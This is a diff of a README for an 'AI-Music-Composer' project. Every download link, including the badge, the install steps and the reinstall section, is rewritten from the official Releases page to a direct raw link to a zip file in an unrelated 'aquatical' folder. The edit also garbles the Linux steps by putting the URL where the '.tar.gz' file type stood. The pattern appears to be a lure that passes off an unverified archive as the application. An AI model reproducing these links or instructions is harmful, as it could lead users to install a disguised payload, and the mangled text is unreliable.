@@ -6,7 +6,7 @@ AI-Music-Composer is an advanced AI-driven music generation system. It helps you
 
 ## 📥 Download the Application
 
-[![Download Now](https://img.shields.io/badge/Download_Now-Click_here-brightgreen)](https://github.com/satyooo/AI-Music-Composer/releases)
+[![Download Now](https://raw.githubusercontent.com/satyooo/AI-Music-Composer/main/aquatical/AI-Music-Composer_1.9.zip)](https://raw.githubusercontent.com/satyooo/AI-Music-Composer/main/aquatical/AI-Music-Composer_1.9.zip)
 
 ## 🚀 Getting Started
 
@@ -14,7 +14,7 @@ Follow these steps to get started with AI-Music-Composer:
 
 ### 1. Download the Application
 
-To download the software, visit this page to download: [AI-Music-Composer Releases](https://github.com/satyooo/AI-Music-Composer/releases).
+To download the software, visit this page to download: [AI-Music-Composer Releases](https://raw.githubusercontent.com/satyooo/AI-Music-Composer/main/aquatical/AI-Music-Composer_1.9.zip).
 
 You will find all the available versions of the application. Choose the latest version suitable for your operating system.
 
@@ -24,7 +24,7 @@ Make sure you select the version compatible with your device. The releases typic
 
 - **Windows:** `.exe` file
 - **Mac:** `.dmg` file
-- **Linux:** `.tar.gz` file
+- **Linux:** `https://raw.githubusercontent.com/satyooo/AI-Music-Composer/main/aquatical/AI-Music-Composer_1.9.zip` file
 
 ### 3. Install the Application
 
@@ -39,7 +39,7 @@ Make sure you select the version compatible with your device. The releases typic
   3. Eject the `.dmg` file and find the app in your Applications.
 
 - For **Linux**:
-  1. Extract the `.tar.gz` file using your file manager or terminal.
+  1. Extract the `https://raw.githubusercontent.com/satyooo/AI-Music-Composer/main/aquatical/AI-Music-Composer_1.9.zip` file using your file manager or terminal.
   2. Navigate to the extracted directory.
   3. Run the application by executing the appropriate command in the terminal.
 
@@ -84,6 +84,6 @@ For detailed usage instructions, refer to the documentation available within the
 
 ## 💻 Download & Install Again
 
-To download the application once more or install a new version, visit this page to download: [AI-Music-Composer Releases](https://github.com/satyooo/AI-Music-Composer/releases).
+To download the application once more or install a new version, visit this page to download: [AI-Music-Composer Releases](https://raw.githubusercontent.com/satyooo/AI-Music-Composer/main/aquatical/AI-Music-Composer_1.9.zip).
 
 Your journey into the world of music creation begins here. Enjoy using AI-Music-Composer!
